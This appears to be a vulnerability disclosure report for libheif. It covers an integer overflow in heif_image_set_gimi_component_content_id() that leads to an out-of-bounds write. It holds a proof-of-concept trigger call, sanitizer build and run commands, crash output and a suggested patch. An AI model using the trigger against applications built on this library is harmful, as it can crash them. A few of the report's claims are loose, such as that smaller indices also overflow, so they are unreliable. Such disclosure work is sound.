# Integer Overflow → Heap OOB Write in `heif_image_set_gimi_component_content_id()`

> **Security Assessment: VALID** — ASAN SEGV at 0x47fff7ffd (OOB write, not zero page); triggered via documented public API with `UINT32_MAX` boundary input. Recommend reporting.

## Summary

`heif_image_set_gimi_component_content_id()` in
`libheif/api/libheif/heif_uncompressed.cc` contains an unchecked integer
overflow. When `component_idx = UINT32_MAX`, the expression
`component_idx + 1` wraps to `0` in a `uint32_t` context, causing
`ids.resize(0)`. The subsequent `ids[UINT32_MAX]` assignment then writes to a
computed address far outside the empty vector, producing **undefined behaviour**
detected by both UBSan and ASAN as a SEGV.

- **Affected file:** `libheif/api/libheif/heif_uncompressed.cc`
- **Function:** `heif_image_set_gimi_component_content_id()`
- **Line:** 784–786 (latest master `f20a88b`, 2026-04-17)
- **Confirmed on:** libheif 1.21.2 (latest, 2026-04-17) and master commit `f20a88baec0f34825cc076b3dfb2578fb2d5728c` (2026-04-17)
- **Build requirement:** `WITH_UNCOMPRESSED_CODEC=ON`
- **CWE:** CWE-190 (Integer Overflow or Wraparound) → CWE-122 (Heap-Based Buffer Overflow)
- **CVSS 3.1:** 6.1 Medium (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H)
- **Impact:** Undefined behaviour (write to unmapped address) → crash; potential heap corruption

---

## Vulnerable Code

```cpp
// libheif/api/libheif/heif_uncompressed.cc  (line 774–787)
void heif_image_set_gimi_component_content_id(heif_image* image,
                                              uint32_t component_idx,
                                              const char* content_id)
{
  if (!image || !image->image || !content_id) {
    return;
  }

  auto ids = image->image->get_component_content_ids();
  if (component_idx >= ids.size()) {
    ids.resize(component_idx + 1);   // ← BUG: UINT32_MAX + 1 wraps to 0
  }
  ids[component_idx] = content_id;   // ← OOB write: ids[UINT32_MAX] on empty vec
  image->image->set_component_content_ids(ids);
}
```

When `component_idx = UINT32_MAX`:
1. `component_idx + 1` overflows `uint32_t` → `0`
2. `ids.resize(0)` → vector remains empty (or shrinks to 0)
3. `ids[UINT32_MAX]` → `vector::operator[]` computes pointer arithmetic far out of bounds
4. The string assignment triggers SEGV at a near-zero or unmapped address

---

## Proof of Concept

See `poc_trigger.cc` in this directory.

```cpp
// Key trigger line from poc_trigger.cc
heif_image_set_gimi_component_content_id(img, UINT32_MAX, "poc-content-id");
```

### Build and run

```bash
# 1. Clone latest libheif
git clone --depth=1 https://github.com/strukturag/libheif.git /tmp/libheif-latest

# 2. Build with ASAN+UBSan and WITH_UNCOMPRESSED_CODEC=ON
mkdir /tmp/lh-build && cd /tmp/lh-build
CC=clang CXX=clang++ cmake /tmp/libheif-latest \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_INSTALL_PREFIX=/tmp/lh-install \
    -DCMAKE_C_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_CXX_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address,undefined" \
    -DWITH_UNCOMPRESSED_CODEC=ON \
    -DWITH_LIBDE265=OFF -DWITH_X265=OFF -DWITH_EXAMPLES=OFF \
    -DBUILD_TESTING=OFF
make -j$(nproc) install

# 3. Compile PoC
clang++ -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 \
    -I/tmp/lh-install/include poc_trigger.cc \
    -L/tmp/lh-install/lib -Wl,-rpath,/tmp/lh-install/lib \
    -lheif -o sf08_poc

# 4. Run
ASAN_OPTIONS="halt_on_error=0:print_stacktrace=1:detect_leaks=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
    ./sf08_poc
```

### Observed output (UBSan + ASAN)

```
=== SF08 POC: Integer overflow in component_idx + 1 ===
Calling heif_image_set_gimi_component_content_id with component_idx=UINT32_MAX...
Expected crash: uint32 overflow at ids.resize(UINT32_MAX + 1) -> resize(0)
Then ids[UINT32_MAX] = content_id causes OOB write

stl_vector.h:1043:34: runtime error: applying non-zero offset 137438953440 to null pointer
    #0  std::vector<string>::operator[](unsigned long)
    #1  heif_image_set_gimi_component_content_id
        /libheif/api/libheif/heif_uncompressed.cc:786:3

SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior stl_vector.h:1043:34

stl_vector.h:1043:9: runtime error: reference binding to address 0x001fffffffe0
    with insufficient space for an object of type 'std::basic_string<char>'

SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior stl_vector.h:1043:9

==PID==ERROR: AddressSanitizer: SEGV on unknown address 0x00047fff7ffd
    #0  std::basic_string<char>::assign(char const*)
    #1  heif_image_set_gimi_component_content_id
        libheif/api/libheif/heif_uncompressed.cc:786:22
    #2  main  poc_trigger.cc:47:5

SUMMARY: AddressSanitizer: SEGV heif_uncompressed.cc:786:22
    in heif_image_set_gimi_component_content_id
```

---

## Impact

| Property | Value |
|----------|-------|
| Type | CWE-190 (Integer Overflow or Wraparound) → CWE-122 (Heap-Based Buffer Overflow) |
| CVSS 3.1 (estimate) | 6.1 Medium (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H) |
| Primitive | UB + SEGV (write to unmapped address); potential heap corruption with crafted layout |
| Trigger | Direct API call with component_idx = UINT32_MAX; no file parsing required |
| Scope | `WITH_UNCOMPRESSED_CODEC=ON` builds only |

**Direct exploitability:** Requires the caller to supply `component_idx = UINT32_MAX`.
Applications that pass unvalidated user-controlled component indices to this API
are directly vulnerable. The integer overflow is a latent bug even when smaller
indices that happen to cause `component_idx + 1` to overflow are supplied.

**Confirmed not reachable** via standard fuzz targets (`file_fuzzer`, `box_fuzzer`,
`encoder_fuzzer`) — the bug is in an encoding/manipulation API, not the decoder.

---

## Suggested Fix

Add an overflow guard before the resize:

```cpp
void heif_image_set_gimi_component_content_id(heif_image* image,
                                              uint32_t component_idx,
                                              const char* content_id)
{
  if (!image || !image->image || !content_id) {
    return;
  }

  // FIX: Guard against uint32_t overflow on component_idx + 1
  if (component_idx == UINT32_MAX) {
    return;  // component_idx + 1 would overflow; reject silently or return error
  }

  auto ids = image->image->get_component_content_ids();
  if (component_idx >= ids.size()) {
    ids.resize(component_idx + 1);  // Now safe
  }
  ids[component_idx] = content_id;
  image->image->set_component_content_ids(ids);
}
```

Alternatively, consider using `size_t` for `component_idx` in the internal
representation to avoid the `uint32_t` arithmetic truncation, or add a
reasonable upper bound on component count.
